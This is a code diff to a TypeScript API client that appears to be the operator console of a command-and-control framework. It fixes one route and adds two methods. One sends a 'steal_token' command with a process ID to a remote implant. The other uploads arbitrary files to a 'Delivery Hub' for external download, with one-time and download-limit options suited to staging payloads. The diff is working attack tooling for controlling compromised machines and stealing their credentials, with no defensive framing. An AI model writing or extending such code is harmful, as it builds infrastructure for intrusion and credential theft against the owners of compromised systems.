@@ -437,10 +437,34 @@ export default {
       uriPath?: string
       publicKey?: string
     }){
+        // 【断链修复】原误指 /client/batch-command(批量下发命令接口,功能坏+越权),
+        // 正确路由为 /webdelivery/preview-urls
         return request({
-            url: "/client/batch-command",
+            url: "/webdelivery/preview-urls",
             method: "POST",
             data
+        })
+    },
+
+    // 窃取进程令牌(复用命令通道,后端 steal_token 前缀已注册;与右键菜单
+    // sendCmd('steal_token '+pid) 行为一致,响应契约同为 {status:200,data:""})
+    steal_token(data: { uid: string; pid: string }) {
+        return this.send_commands({ uid: data.uid, command: `steal_token ${data.pid}` })
+    },
+
+    // 文件托管: 上传任意文件经 Delivery Hub /d/ 通道对外分发
+    host_file(data: { file: File; contentType?: string; uriPath?: string; oneTime?: string; maxDownloads?: string; note?: string }) {
+        const formData = new FormData()
+        formData.append("file", data.file)
+        if (data.contentType) formData.append("contentType", data.contentType)
+        if (data.uriPath) formData.append("uriPath", data.uriPath)
+        if (data.oneTime) formData.append("oneTime", data.oneTime)
+        if (data.maxDownloads) formData.append("maxDownloads", data.maxDownloads)
+        if (data.note) formData.append("note", data.note)
+        return request({
+            url: "/webdelivery/host-file",
+            method: "POST",
+            data: formData
         })
     },
     
